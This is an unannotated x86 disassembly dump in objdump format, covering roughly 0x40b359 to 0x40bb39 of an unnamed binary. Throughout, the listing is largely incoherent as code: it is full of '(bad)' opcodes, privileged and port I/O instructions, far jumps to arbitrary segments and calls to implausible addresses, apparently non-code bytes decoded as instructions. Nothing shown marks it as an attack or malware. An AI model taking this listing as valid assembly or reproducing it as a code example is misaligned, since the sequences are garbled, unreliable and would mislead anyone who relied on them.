  40b359:	jne    0x40b33f
  40b35b:	mov    eax,DWORD PTR [ebp-0x77]
  40b35e:	ror    DWORD PTR [ebx+0x899408],0xe0
  40b365:	mov    esi,DWORD PTR [ebp-0x75]
  40b368:	pop    esi
  40b369:	nop
  40b36a:	mov    eax,DWORD PTR [eax]
  40b36c:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40b372:	add    al,0x0
  40b374:	inc    ebp
  40b375:	mov    eax,DWORD PTR [ebx]
  40b377:	mov    ebp,ebx
  40b379:	cmp    al,0xf
  40b37b:	or     al,al
  40b37d:	inc    ebp
  40b37e:	inc    ebp
  40b37f:	xor    eax,0x8bc89c8b
  40b384:	ins    BYTE PTR es:[edi],dx
  40b385:	cld    
  40b386:	add    BYTE PTR [edi+0x576c16c0],dh
  40b38c:	add    BYTE PTR [ecx-0x5],dl
  40b38f:	add    eax,0x17200
  40b394:	sbb    al,0x85
  40b396:	dec    esp
  40b397:	je     0x40b3d1
  40b399:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40b39d:	add    BYTE PTR [ebx],bh
  40b39f:	(bad)  
  40b3a0:	and    al,0x34
  40b3a2:	jae    0x40b340
  40b3a4:	mov    cl,cl
  40b3a6:	inc    DWORD PTR [esp]
  40b3a9:	push   ebp
  40b3aa:	shr    esp,0x8
  40b3ad:	in     al,dx
  40b3ae:	push   esp
  40b3af:	and    DWORD PTR [eax],0xffffffdc
  40b3b2:	retf   
  40b3b3:	(bad)  
  40b3b4:	mov    bh,0xe4
  40b3b6:	add    BYTE PTR [ebp+0x450ff8e9],dh
  40b3bc:	retf   0x4cf5
  40b3bf:	pushf  
  40b3c0:	and    bh,al
  40b3c2:	pop    ss
  40b3c3:	rcr    cl,1
  40b3c5:	test   DWORD PTR [eax],eax
  40b3c7:	clc    
  40b3c8:	add    BYTE PTR [ebp+0x2b],al
  40b3cb:	xor    eax,ecx
  40b3cd:	pushf  
  40b3ce:	add    eax,0xd001c7
  40b3d3:	add    eax,0x456cf8c0
  40b3d8:	inc    eax
  40b3d9:	push   ebx
  40b3da:	rcr    DWORD PTR [eax+0x4c0105],0x20
  40b3e1:	inc    ebp
  40b3e2:	fst    DWORD PTR [esi+0x29]
  40b3e5:	mov    eax,DWORD PTR [eax]
  40b3e7:	nop
  40b3e8:	rol    BYTE PTR [eax],0xc0
  40b3eb:	mov    ecx,DWORD PTR [ebp-0x3c4fdbe4]
  40b3f1:	add    DWORD PTR [ebx-0x75f9af00],ecx
  40b3f7:	pop    ebp
  40b3f8:	add    DWORD PTR [ecx+0x758bf800],ecx
  40b3fe:	or     BYTE PTR [ebp-0xce8aca],al
  40b404:	mov    bl,BYTE PTR [eax]
  40b406:	add    DWORD PTR [ebp+0x0],edx
  40b409:	call   0xfff3b317
  40b40e:	add    DWORD PTR [edi],ecx
  40b410:	add    BYTE PTR [edi],al
  40b412:	push   cs
  40b413:	inc    ecx
  40b414:	or     BYTE PTR [ebx+0x18008901],0x8
  40b41b:	leave  
  40b41c:	dec    ecx
  40b41d:	dec    esi
  40b41e:	add    esi,DWORD PTR [ebp-0x39]
  40b421:	call   0xffe6a322
  40b426:	clc    
  40b427:	inc    ebp
  40b428:	inc    ebp
  40b429:	mov    ecx,DWORD PTR [edi]
  40b42b:	enter  0x49,0x35
  40b42f:	mov    ecx,DWORD PTR [eax]
  40b431:	xor    eax,0x79e0807
  40b436:	xor    bl,BYTE PTR [esi-0x743ecda2]
  40b43c:	or     al,0x1c
  40b43e:	sbb    BYTE PTR ds:0x8b004d01,0x0
  40b445:	int3   
  40b446:	test   DWORD PTR [eax],eax
  40b448:	clc    
  40b449:	inc    edx
  40b44b:	mov    eax,DWORD PTR [eax]
  40b44d:	fmul   DWORD PTR [ebx+0x74ff8300]
  40b453:	sub    BYTE PTR [ebp-0x40],ah
  40b456:	add    BYTE PTR [esi+0x45],bl
  40b459:	leave  
  40b45a:	xor    eax,0xc78b9c18
  40b45f:	jl     0x40b441
  40b461:	add    BYTE PTR [ebp+0x458df88b],al
  40b467:	add    al,0x31
  40b469:	or     BYTE PTR [eax+ebp*8-0x3617f139],bl
  40b470:	test   edx,esp
  40b472:	clc    
  40b473:	or     eax,DWORD PTR [ebp+0x40]
  40b476:	xor    eax,0x8b949f89
  40b47b:	inc    ebp
  40b47c:	sbb    al,0xbe
  40b47e:	mov    ecx,DWORD PTR [eax]
  40b480:	xchg   esp,eax
  40b481:	pop    es
  40b482:	add    dh,al
  40b484:	mov    esp,DWORD PTR [ebp+0x1c]
  40b487:	add    BYTE PTR [edi-0x62],dl
  40b48a:	mov    eax,0x30132
  40b48f:	mov    DWORD PTR [ebp-0x68],eax
  40b492:	mov    eax,DWORD PTR [ebp-0x74]
  40b495:	xor    eax,DWORD PTR [eax]
  40b497:	add    ecx,DWORD PTR [ebx-0xf637677]
  40b49d:	inc    ebp
  40b49e:	jge    0x40b4f0
  40b4a0:	mov    DWORD PTR [ebp-0xc],eax
  40b4a3:	xor    eax,eax
  40b4a5:	add    ecx,DWORD PTR [ebx]
  40b4a7:	push   eax
  40b4a8:	jne    0x40b4ef
  40b4aa:	mov    eax,DWORD PTR ds:0x3f001c
  40b4b0:	dec    DWORD PTR [ebx-0x7f74e375]
  40b4b6:	add    eax,DWORD PTR [ecx]
  40b4b8:	cmp    al,0x0
  40b4ba:	push   cs
  40b4bb:	inc    ebp
  40b4bc:	inc    ebp
  40b4bd:	add    al,0x85
  40b4bf:	add    BYTE PTR [edi+edi*8-0x1],dh
  40b4c3:	mov    ebx,DWORD PTR [esp+ecx*1]
  40b4c6:	mov    ebp,0x8bffff4d
  40b4cb:	mov    ebx,DWORD PTR [esp+esi*8]
  40b4ce:	sbb    al,0x1
  40b4d1:	inc    ebp
  40b4d2:	add    BYTE PTR [ebx-0x74a87700],cl
  40b4d8:	push   ecx
  40b4d9:	clc    
  40b4da:	add    eax,0x457218
  40b4df:	mov    eax,DWORD PTR [ebp+0x50]
  40b4e2:	jne    0x40b529
  40b4e4:	mov    ecx,DWORD PTR [ebx-0x39761fe4]
  40b4ea:	add    edi,eax
  40b4ec:	add    BYTE PTR [ebp+0x31],al
  40b4ef:	lea    eax,[eax+0x4501dc]
  40b4f5:	lea    edx,[eax-0x74]
  40b4f8:	xor    ecx,DWORD PTR [ebx-0x39a4f7a1]
  40b4fe:	ret    0xc7
  40b501:	mov    eax,DWORD PTR [eax+0xee011c]
  40b507:	add    BYTE PTR [eax],cl
  40b509:	push   eax
  40b50a:	inc    ebp
  40b50b:	inc    ebp
  40b50c:	add    DWORD PTR [ebx+0x8b98eb],ecx
  40b512:	test   edi,eax
  40b514:	jne    0x40b4a2
  40b516:	mov    eax,DWORD PTR [eax]
  40b518:	mov    eax,DWORD PTR [eax]
  40b51a:	push   eax
  40b51b:	pop    ebp
  40b51c:	inc    ebp
  40b51d:	dec    DWORD PTR [ebx+0x570ce48b]
  40b523:	rcl    BYTE PTR [ecx-0x40],1
  40b526:	xor    esi,DWORD PTR [eax]
  40b528:	add    DWORD PTR [ebp-0x70],0xffffff83
  40b52c:	mov    edi,0x8372fc
  40b531:	push   eax
  40b532:	(bad)  
  40b533:	jbe    0x40b57a
  40b535:	mov    ecx,DWORD PTR [ebx-0x39341714]
  40b53b:	ret    
  40b53c:	(bad)  
  40b53d:	dec    ebp
  40b53e:	inc    ebp
  40b53f:	jmp    0x40b4ce
  40b541:	mov    ecx,DWORD PTR [esp+eiz*8-0xf7f375]
  40b548:	(bad)  
  40b549:	cld    
  40b54a:	(bad)  
  40b54b:	push   ebp
  40b54c:	mov    ecx,DWORD PTR [eax+0x18aa8b1c]
  40b552:	add    BYTE PTR [ebx],bh
  40b554:	push   eax
  40b555:	push   eax
  40b556:	inc    ebp
  40b557:	jmp    0x3d900e7
  40b55c:	add    BYTE PTR [ebx+0x8ca0c7],cl
  40b562:	add    BYTE PTR [ebx-0x13cfd500],cl
  40b568:	inc    ebp
  40b569:	ret    
  40b56a:	mov    DWORD PTR [ebp-0x14],edx
  40b56d:	mov    edx,eax
  40b56f:	sub    BYTE PTR [ebp-0x2d],cl
  40b572:	mov    ecx,DWORD PTR [ebp-0x75]
  40b575:	mov    eax,esi
  40b577:	rol    BYTE PTR [eax],1
  40b579:	inc    ebp
  40b57a:	add    DWORD PTR [eax],eax
  40b57c:	inc    ebp
  40b57d:	add    BYTE PTR [ecx+0x18838beb],cl
  40b583:	clc    
  40b584:	inc    eax
  40b585:	jmp    0x8d45:0x74945589
  40b58c:	xor    ecx,DWORD PTR [eax]
  40b58e:	add    edx,DWORD PTR [ebp-0x77]
  40b591:	mov    ebx,DWORD PTR [eax-0x76aaba18]
  40b597:	mov    ebx,DWORD PTR [eax+edi*8-0x76af48bb]
  40b59e:	inc    ebp
  40b59f:	fdiv   DWORD PTR [ebx]
  40b5a1:	loop   0x40b5a6
  40b5a3:	(bad)  
  40b5a5:	add    BYTE PTR [ebp+0x55],al
  40b5a8:	add    eax,0xd8008b
  40b5ad:	jmp    0xcd80:0x621c818b
  40b5b4:	add    DWORD PTR [ebx],esi
  40b5b6:	add    BYTE PTR [ecx-0x63fbcdbb],al
  40b5bc:	add    BYTE PTR [ebp-0x77],dh
  40b5bf:	mov    edx,DWORD PTR [eax+0x45cb30d4]
  40b5c5:	dec    ebp
  40b5c6:	inc    DWORD PTR [ebx]
  40b5c8:	test   DWORD PTR [ebx+0x108b0074],eax
  40b5ce:	sbb    BYTE PTR [ebp+0x65],dl
  40b5d1:	add    eax,DWORD PTR [eax]
  40b5d3:	mov    edi,DWORD PTR [eax-0x75]
  40b5d6:	add    ah,dl
  40b5d8:	and    edx,DWORD PTR [ecx*2-0x741bd475]
  40b5df:	dec    ebp
  40b5e0:	mov    DWORD PTR [ebx-0xfc071c],eax
  40b5e6:	dec    ebp
  40b5e7:	call   0x55426376
  40b5ec:	inc    ebp
  40b5ed:	add    DWORD PTR [ebx+0x855fcf4],ecx
  40b5f3:	cmp    ecx,DWORD PTR [ebp-0x5c]
  40b5f6:	inc    eax
  40b5f7:	add    BYTE PTR [ecx+0x73],dl
  40b5fa:	jb     0x40b5ff
  40b5fc:	mov    esi,eax
  40b5fe:	cmp    al,0x50
  40b600:	retf   
  40b601:	mov    DWORD PTR [ecx+0x4500f0],eax
  40b607:	test   ebx,edx
  40b609:	andnps xmm6,XMMWORD PTR [edx+0x3]
  40b60d:	dec    DWORD PTR [ecx+0x51ecfc8b]
  40b613:	inc    ebp
  40b614:	add    eax,edi
  40b616:	mov    DWORD PTR [eax+ebx*1-0x38ffab00],ecx
  40b61d:	inc    ecx
  40b61e:	hlt    
  40b61f:	mov    DWORD PTR [eax],eax
  40b621:	xchg   esp,eax
  40b622:	add    BYTE PTR [ebp+0x7d],al
  40b625:	xor    eax,edx
  40b627:	add    edx,ecx
  40b629:	mov    DWORD PTR [ecx+0x5f45e898],ecx
  40b62f:	mov    DWORD PTR [eax-0x64],edx
  40b632:	mov    DWORD PTR [ebp-0x8],eax
  40b635:	push   eax
  40b636:	push   ebp
  40b637:	inc    ebp
  40b638:	mov    DWORD PTR [ebx],esi
  40b63a:	call   0xf910b42
  40b63f:	inc    ebp
  40b640:	adc    al,BYTE PTR ds:0x810055
  40b646:	dec    DWORD PTR [ebx-0x7f76e400]
  40b64c:	aam    0x1
  40b64e:	push   ebp
  40b64f:	add    cl,al
  40b651:	xor    BYTE PTR [eax*2-0x7472003e],cl
  40b658:	call   FWORD PTR [esi+edx*8]
  40b65b:	cmp    dl,0x1
  40b65e:	test   DWORD PTR [eax],eax
  40b660:	clc    
  40b661:	inc    ebp
  40b662:	and    cl,BYTE PTR [ebx+0x7503fc4d]
  40b668:	mov    DWORD PTR [ecx+0x1008ffd4],ecx
  40b66e:	cmp    edi,edi
  40b670:	je     0x40b642
  40b672:	mov    eax,DWORD PTR [ebp-0x4]
  40b675:	add    edx,DWORD PTR [ecx]
  40b677:	sbb    al,0x0
  40b679:	dec    ebp
  40b67a:	dec    ebp
  40b67b:	mov    DWORD PTR [ecx+0x4545011c],ecx
  40b681:	mov    ecx,DWORD PTR [ebx+0x4590181c]
  40b687:	add    DWORD PTR [edx],eax
  40b689:	add    BYTE PTR [ebp+0x45],cl
  40b68c:	jne    0x40b619
  40b68e:	mov    ecx,DWORD PTR [eax+esi*8-0x7474ab00]
  40b695:	cmp    esp,esi
  40b697:	jb     0x40b62a
  40b699:	mov    eax,DWORD PTR [eax]
  40b69b:	mov    eax,DWORD PTR [eax]
  40b69d:	mov    edx,DWORD PTR [esp+edi*1]
  40b6a0:	inc    ebp
  40b6a1:	je     0x40b62e
  40b6a3:	push   eax
  40b6a4:	add    al,0x38
  40b6a6:	push   ebp
  40b6a7:	mov    DWORD PTR ds:[ecx],edi
  40b6aa:	in     al,0xc
  40b6ac:	shl    BYTE PTR [eax],cl
  40b6ae:	test   DWORD PTR [ecx],eax
  40b6b0:	call   DWORD PTR [edx]
  40b6b2:	inc    esi
  40b6b4:	inc    ebp
  40b6b5:	ror    BYTE PTR [ecx+0x45459011],1
  40b6bb:	jmp    0xff41b3c4
  40b6c0:	mov    ecx,DWORD PTR [ebx-0xfba7eb0]
  40b6c6:	mov    eax,DWORD PTR [eax]
  40b6c8:	loopne 0x40b655
  40b6ca:	(bad)  
  40b6cb:	sbb    al,0xc7
  40b6cd:	inc    ebp
  40b6ce:	inc    ebp
  40b6cf:	push   ebx
  40b6d0:	lea    edi,[eax+0x454fdc]
  40b6d6:	lea    ecx,[ecx-0x74a774]
  40b6dc:	or     BYTE PTR [edi-0x3a],dl
  40b6df:	js     0x40b6a8
  40b6e1:	mov    ecx,DWORD PTR [ebx-0x117ae39a]
  40b6e7:	inc    DWORD PTR [eax]
  40b6e9:	call   DWORD PTR [eax+0x79]
  40b6ec:	inc    ebp
  40b6ed:	add    BYTE PTR [ebx+0x859866],cl
  40b6f3:	(bad)  
  40b6f4:	(bad)  
  40b6f5:	dec    DWORD PTR [ebx-0x2f99f3b9]
  40b6fb:	test   DWORD PTR [ebp-0x1],eax
  40b6fe:	mov    edi,edi
  40b700:	add    al,0x0
  40b703:	add    ax,WORD PTR [ebp-0xb20004]
  40b70a:	inc    DWORD PTR [edx+0x14]
  40b70d:	add    BYTE PTR [eax],cl
  40b70f:	data16 jne 0x40b697
  40b712:	push   ebx
  40b713:	call   DWORD PTR [ebp-0x1]
  40b716:	mov    eax,eax
  40b718:	cld    
  40b719:	inc    bp
  40b71b:	test   DWORD PTR [ebp+0x45ff04ff],ecx
  40b721:	inc    eax
  40b722:	mov    eax,DWORD PTR [eax]
  40b724:	sbb    al,0x66
  40b726:	inc    ebp
  40b727:	test   DWORD PTR [ebx+0xff90ff],ecx
  40b72d:	ror    BYTE PTR [ebx-0x7f7ae39a],0xff
  40b734:	add    edi,edi
  40b736:	add    BYTE PTR [ebp+0x30],al
  40b739:	add    BYTE PTR [ecx],dh
  40b73b:	popw   ds
  40b73d:	test   DWORD PTR [edx],esi
  40b73f:	(bad)  
  40b740:	cmp    bh,bh
  40b742:	jbe    0x40b70b
  40b744:	lea    ecx,[ecx-0x7493c9]
  40b74a:	add    edi,DWORD PTR [eax+0x734f39]
  40b750:	mov    ecx,DWORD PTR [ecx-0x749175]
  40b756:	sub    edi,DWORD PTR [eax+0x89d003]
  40b75c:	mov    ecx,DWORD PTR [ecx-0x698f04]
  40b762:	(bad)  
  40b763:	mov    eax,0xecd755
  40b768:	in     al,dx
  40b769:	mov    DWORD PTR [eax],eax
  40b76b:	jb     0x40b76d
  40b76d:	inc    DWORD PTR [ebp-0x48]
  40b770:	mov    ecx,esp
  40b772:	sbb    al,0x0
  40b774:	push   esi
  40b775:	mov    DWORD PTR ds:0x66ff0074,ecx
  40b77b:	mov    DWORD PTR [ebp-0x7a0014],0xad7d8df8
  40b785:	add    bh,al
  40b787:	mov    WORD PTR [ebp-0xa6],ax
  40b78e:	mov    eax,0x354f45
  40b793:	pushf  
  40b794:	mov    DWORD PTR [ebp-0x7600fda4],ecx
  40b79a:	lea    edi,[eax+0x4]
  40b79d:	dec    DWORD PTR [ecx-0x1ba13a]
  40b7a3:	mov    BYTE PTR [ebx-0x7639af1b],0xe6
  40b7aa:	pusha  
  40b7ab:	(bad)  
  40b7ac:	jmp    edi
  40b7ae:	mov    eax,0xe84fc6
  40b7b3:	xor    ecx,DWORD PTR [ecx-0x169d3a]
  40b7b9:	xor    eax,DWORD PTR [ebx-0x76ff3a42]
  40b7bf:	add    BYTE PTR [esp+eax*2-0x1],ah
  40b7c3:	in     al,0xb8
  40b7c5:	mov    dh,0x4f
  40b7c7:	add    DWORD PTR [eax],0x49
  40b7ca:	mov    esi,ebx
  40b7cc:	data16 mov bh,bh
  40b7cf:	add    DWORD PTR [ebx-0x7613c7fa],0x45
  40b7d6:	push   0xb845ffe3
  40b7db:	loope  0x40b82c
  40b7dd:	inc    ebp
  40b7de:	add    bl,dl
  40b7e0:	mov    DWORD PTR [ebp+0x6a],eax
  40b7e3:	out    dx,al
  40b7e4:	inc    DWORD PTR [ebp-0x75]
  40b7e7:	and    DWORD PTR [esi+0x45],esp
  40b7ea:	test   DWORD PTR [esi],ebp
  40b7ec:	inc    DWORD PTR [ebp-0x1]
  40b7ef:	jl     0x40b83a
  40b7f1:	leave  
  40b7f2:	add    BYTE PTR [esi+eiz*2-0x24],al
  40b7f6:	test   DWORD PTR [esi+0x49ff83ff],esi
  40b7fc:	outs   dx,DWORD PTR ds:[esi]
  40b7fd:	fiadd  WORD PTR [eax]
  40b7ff:	mov    BYTE PTR [esi-0x7d],ah
  40b802:	test   DWORD PTR [edi],eax
  40b804:	(bad)  
  40b805:	in     al,dx
  40b806:	inc    DWORD PTR [ebp+0x6c]
  40b809:	loope  0x40b80b
  40b80b:	inc    ebp
  40b80c:	data16 aam 0x85
  40b80f:	inc    ebp
  40b810:	(bad)  
  40b811:	call   0xe5bcfe15
  40b816:	add    BYTE PTR [ebp+0x66],al
  40b819:	fild   WORD PTR [ebp-0x1300bb]
  40b81f:	inc    ebp
  40b820:	inc    ebp
  40b821:	xlat   BYTE PTR ds:[ebx]
  40b822:	xor    al,0x45
  40b824:	pushf  
  40b825:	jl     0x40b7df
  40b827:	leave  
  40b828:	icebp  
  40b829:	inc    esp
  40b82a:	add    ah,dl
  40b82c:	mov    DWORD PTR [esi+0x49ff8376],esi
  40b832:	(bad)  
  40b833:	fdivrp st(0),st
  40b835:	mov    BYTE PTR [ebp+0x4708f883],al
  40b83b:	in     al,dx
  40b83c:	test   WORD PTR [ebp-0x1],ax
  40b843:	inc    ebp
  40b844:	inc    ebp
  40b845:	mov    edx,ebp
  40b847:	cld    
  40b848:	inc    ebp
  40b849:	out    dx,eax
  40b84a:	rcl    BYTE PTR [ebx],1
  40b84c:	inc    ebp
  40b84d:	mov    edi,edx
  40b84f:	mov    eax,DWORD PTR [ebp+0x54]
  40b852:	and    edi,edi
  40b854:	inc    ebp
  40b855:	cmp    ebp,DWORD PTR [esi]
  40b857:	jne    0x40b82b
  40b859:	mov    DWORD PTR [ebp-0x44],0xf8c9857c
  40b860:	retf   
  40b861:	inc    ebp
  40b862:	add    dl,ah
  40b864:	lea    ebx,[ebp+ecx*1+0x181c0f8b]
  40b86b:	xor    bl,0x1
  40b86e:	add    eax,DWORD PTR [eax]
  40b870:	inc    ecx
  40b871:	adc    BYTE PTR [eax],bl
  40b873:	test   ecx,edi
  40b875:	add    dh,BYTE PTR [edx+0x0]
  40b878:	mov    BYTE PTR [ebp-0x24],0x8b
  40b87c:	(bad)  
  40b87d:	jl     0x40b85c
  40b87f:	add    dh,al
  40b881:	mov    esi,ebx
  40b883:	mov    eax,esi
  40b885:	sbb    al,0xdf
  40b887:	add    dh,0x1
  40b88a:	loopne 0x40b88c
  40b88c:	(bad)  
  40b88d:	adc    cl,ah
  40b88f:	or     dh,al
  40b891:	inc    ebp
  40b892:	loop   0x40b875
  40b894:	xor    ebp,eax
  40b896:	(bad)  
  40b897:	(bad)  
  40b898:	or     eax,0x18ec0ff8
  40b89d:	jl     0x40b892
  40b89f:	inc    ebp
  40b8a0:	add    ebx,DWORD PTR [ecx+0x41]
  40b8a3:	adc    BYTE PTR [eax],bl
  40b8a5:	repnz stc 
  40b8a7:	xor    BYTE PTR [edx+0x35],0xc6
  40b8ab:	adc    ah,dl
  40b8ad:	dec    ecx
  40b8ae:	(bad)  
  40b8af:	repnz aad 0x45
  40b8b2:	(bad)  
  40b8b3:	mov    esi,edx
  40b8b5:	adc    al,0xc6
  40b8b7:	call   edi
  40b8b9:	(bad)  
  40b8ba:	(bad)  
  40b8bb:	adc    al,bl
  40b8bd:	inc    esi
  40b8bf:	push   eax
  40b8c0:	fld    DWORD PTR [ebp-0x3a]
  40b8c3:	mov    esi,0x7c608da
  40b8c8:	fcmovnb st,st(6)
  40b8ca:	xor    ebx,DWORD PTR [esi+0x30d328d]
  40b8d0:	(bad)  
  40b8d2:	sbb    BYTE PTR [ebp-0xd],al
  40b8d5:	add    DWORD PTR [ebx],0x66
  40b8d8:	inc    ecx
  40b8d9:	mov    ebx,DWORD PTR [eax]
  40b8db:	sbb    al,0xf9
  40b8dd:	xor    BYTE PTR [edx+0x1],0x8d
  40b8e1:	add    BYTE PTR [ebp+eax*4-0x1],dl
  40b8e5:	dec    DWORD PTR [ecx+0x4d00fcff]
  40b8eb:	add    BYTE PTR [eax+0x7145fc30],bh
  40b8f1:	inc    DWORD PTR [ecx]
  40b8f3:	mov    ecx,DWORD PTR [ebp-0x310010]
  40b8f9:	retf   
  40b8fa:	enter  0xe45,0x3b
  40b8fe:	inc    ebp
  40b8ff:	jne    0x40b936
  40b901:	mov    eax,ds:0x33c70b9c
  40b906:	mov    esp,0xf81585ef
  40b90b:	mov    ds:0x338b0b45,eax
  40b910:	mov    WORD PTR [edi-0x5cc68e00],cs
  40b916:	ud2    
  40b918:	xchg   ebp,eax
  40b919:	xor    eax,DWORD PTR [eax]
  40b91b:	dec    edx
  40b91c:	mov    eax,DWORD PTR [eax]
  40b91e:	sbb    al,0x83
  40b920:	cmp    ah,0x1
  40b923:	push   0x0
  40b925:	pop    eax
  40b926:	adc    BYTE PTR [ecx-0x7483bb],cl
  40b92c:	and    BYTE PTR [esi+0x0],0x85
  40b930:	mov    edi,edi
  40b932:	push   0xffffffff
  40b934:	(bad)  
  40b935:	mov    esp,esi
  40b937:	adc    ah,0x75
  40b93a:	in     eax,0x66
  40b93c:	inc    ebp
  40b93d:	inc    ebp
  40b93e:	fild   QWORD PTR [edx-0x29]
  40b941:	mov    ecx,DWORD PTR [ebp-0x75990be4]
  40b947:	inc    ebp
  40b948:	sub    BYTE PTR [edx+0x49],0x58
  40b94c:	jmp    0x752c:0x40868889
  40b953:	lea    ax,[ebp-0xc]
  40b957:	xor    eax,DWORD PTR [ebp-0x5f0078]
  40b95d:	mov    DWORD PTR [ebp-0x820076],eax
  40b963:	stos   DWORD PTR es:[edi],eax
  40b964:	mov    ebp,DWORD PTR [ebx-0x43a87414]
  40b96a:	push   ecx
  40b96b:	test   DWORD PTR [ebx],esi
  40b96d:	(bad)  
  40b96e:	mov    ebx,0xc072ff
  40b973:	push   ebp
  40b974:	ret    
  40b975:	(bad)  
  40b976:	mov    eax,eax
  40b978:	sbb    al,0xdf
  40b97a:	rcl    ah,0x50
  40b97d:	inc    ebp
  40b97e:	inc    ebp
  40b97f:	into   
  40b980:	mov    ebp,ebx
  40b982:	cwde   
  40b983:	mov    DWORD PTR [eax],0x10d3c7c8
  40b989:	call   0xdf41ff8d
  40b98e:	add    cl,ch
  40b990:	jmp    DWORD PTR [esi-0x75]
  40b993:	inc    ebp
  40b994:	or     BYTE PTR [edi],bh
  40b996:	rol    bh,1
  40b998:	dec    ebp
  40b999:	adc    BYTE PTR [ebx],dh
  40b99b:	inc    DWORD PTR [ebx]
  40b99d:	add    cl,BYTE PTR [ecx-0x3e174400]
  40b9a3:	push   ss
  40b9a4:	push   ds
  40b9a5:	add    dh,ch
  40b9a7:	test   DWORD PTR [ebx-0x1],esi
  40b9aa:	or     eax,0x22850bff
  40b9af:	(bad)  
  40b9b0:	out    dx,al
  40b9b1:	push   DWORD PTR [ebx-0x75]
  40b9b4:	add    eax,0x3357e9ec
  40b9b9:	push   ecx
  40b9ba:	out    dx,al
  40b9bb:	xor    esi,DWORD PTR [ebx+0x3]
  40b9be:	jmp    0x85bb13
  40b9c3:	and    DWORD PTR [ebp+0x44],0x0
  40b9c7:	mov    esp,DWORD PTR [eax]
  40b9c9:	sbb    al,0x66
  40b9cb:	add    BYTE PTR [ebp-0xff00ff],0x30
  40b9d2:	mov    DWORD PTR [ebp+0x7e],eax
  40b9d5:	(bad)  
  40b9d6:	inc    DWORD PTR [ebx-0xbadf9a]
  40b9dc:	push   0xffffffff
  40b9de:	pop    eax
  40b9df:	clc    
  40b9e0:	mov    DWORD PTR [eax],ecx
  40b9e2:	or     BYTE PTR [ecx-0x8aef8d],0x58
  40b9e9:	mov    DWORD PTR [ecx+0x76ff8428],ecx
  40b9ef:	lea    esp,[esi+0x10]
  40b9f2:	inc    ebp
  40b9f3:	jmp    FWORD PTR [edx+0x50]
  40b9f6:	pop    eax
  40b9f7:	inc    ebp
  40b9f8:	mov    DWORD PTR [ebx],esi
  40b9fa:	mov    BYTE PTR [ebx],al
  40b9fc:	rcl    BYTE PTR [eax+0x45],0x85
  40ba00:	inc    WORD PTR [ebp-0x1]
  40ba04:	lea    ecx,[ebx-0x7f99e35f]
  40ba0a:	stos   BYTE PTR es:[edi],al
  40ba0b:	add    DWORD PTR [ebp+0x0],eax
  40ba0e:	mov    ecx,ecx
  40ba10:	adc    al,0x95
  40ba12:	(bad)  
  40ba13:	push   DWORD PTR [ebx]
  40ba15:	dec    DWORD PTR [ebp+0x45ffc095]
  40ba1b:	dec    esp
  40ba1d:	push   ebp
  40ba1e:	loopne 0x40b9a9
  40ba20:	(bad)  
  40ba21:	adc    al,0xc4
  40ba23:	call   ebx
  40ba25:	mov    ebp,ebp
  40ba27:	sbb    BYTE PTR [ebp-0x1],al
  40ba2a:	loop   0x40b9b5
  40ba2c:	ds and al,0xc7
  40ba2f:	dec    esp
  40ba31:	mov    edx,ebp
  40ba33:	sub    al,0xe1
  40ba35:	inc    edi
  40ba37:	mov    eax,edx
  40ba39:	xor    BYTE PTR [edi+edi*8-0x7b],bh
  40ba3d:	(bad)  
  40ba3e:	dec    DWORD PTR [ebx-0x2ffff701]
  40ba44:	add    BYTE PTR [ebp+0x2c],al
  40ba47:	push   eax
  40ba48:	add    bh,dl
  40ba4a:	mov    DWORD PTR [ebp+0x18],edi
  40ba4d:	jbe    0x40ba4e
  40ba4f:	test   DWORD PTR [ebp-0xffefff],ecx
  40ba55:	inc    ebp
  40ba56:	push   eax
  40ba57:	add    DWORD PTR [ebp-0x4],0x801be
  40ba5e:	pop    es
  40ba5f:	add    dh,0xfe
  40ba62:	ret    
  40ba63:	dec    DWORD PTR [ebx-0x3fffe346]
  40ba69:	mov    ecx,0x454f50
  40ba6e:	mov    eax,ecx
  40ba70:	cwde   
  40ba71:	mov    DWORD PTR [eax],eax
  40ba73:	test   al,0xff
  40ba75:	ror    BYTE PTR [ebx-0x2f99f775],0x55
  40ba7c:	lea    ecx,[ebp-0x7600f201]
  40ba82:	mov    ebp,DWORD PTR [edx+ebp*2-0x7a99a73e]
  40ba89:	push   ebp
  40ba8a:	dec    DWORD PTR [ebp-0x767aec01]
  40ba90:	push   DWORD PTR [eax+0x6685c2ff]
  40ba96:	call   DWORD PTR [ebp-0x1]
  40ba99:	lea    ecx,[ebx-0x397613df]
  40ba9f:	mov    ah,0xc3
  40baa1:	mov    DWORD PTR [ebp-0x30a74a],ecx
  40baa7:	mov    DWORD PTR [eax-0x48],edx
  40baaa:	inc    ebp
  40baab:	dec    edx
  40baac:	mov    ecx,DWORD PTR [ebx+0x55006698]
  40bab2:	xor    ecx,DWORD PTR [ebx+0x557c668d]
  40bab8:	dec    DWORD PTR [ebp-0x76e3b277]
  40babe:	call   DWORD PTR [eax-0x6d5f7673]
  40bac4:	lea    eax,[ecx-0x1]
  40bac7:	inc    WORD PTR [ebp-0x73]
  40bacb:	cmp    edi,0x3
  40bace:	dec    DWORD PTR [ecx+0x41ff9695]
  40bad4:	jmp    DWORD PTR [esi-0x73]
  40bad7:	inc    ebp
  40bad8:	jmp    DWORD PTR [esi-0x1]
  40badb:	dec    ebp
  40badc:	lea    esp,[esi-0x1]
  40badf:	jge    0x40bae0
  40bae1:	mov    esi,DWORD PTR [eax]
  40bae3:	lock inc ebp
  40bae5:	mov    bh,0xff
  40bae7:	mov    WORD PTR [ebp-0x3c5f3a],cs
  40baed:	rol    DWORD PTR [eax+0xf8ca289],0x45
  40baf4:	push   cs
  40baf5:	str    WORD PTR [ebp-0x1]
  40baf9:	xor    edi,esp
  40bafb:	add    edi,DWORD PTR [ebp+0x33]
  40bafe:	add    BYTE PTR [esi+0x0],ah
  40bb01:	inc    ebp
  40bb02:	rdpmc  
  40bb04:	mov    edi,0xbf45ff66
  40bb09:	dec    si
  40bb0b:	inc    ebp
  40bb0c:	add    BYTE PTR [ebx+0x45000c12],cl
  40bb12:	mov    edi,edi
  40bb14:	data16 sbb al,0x45
  40bb17:	jne    0x40ba9c
  40bb19:	push   ebp
  40bb1b:	adc    al,0xd0
  40bb1d:	jne    0x40baa8
  40bb1f:	jmp    FWORD PTR [edx+0x66755108]
  40bb25:	call   0xffc4b37f
  40bb2a:	or     BYTE PTR [ebp-0x77],al
  40bb2d:	mov    ebp,DWORD PTR [esi+0x6645511c]
  40bb33:	mov    edx,DWORD PTR [ebp-0x70]
  40bb36:	add    DWORD PTR [eax],0x3
  40bb39:	mov    ecx,DWORD PTR [ecx+0x5180b21c]
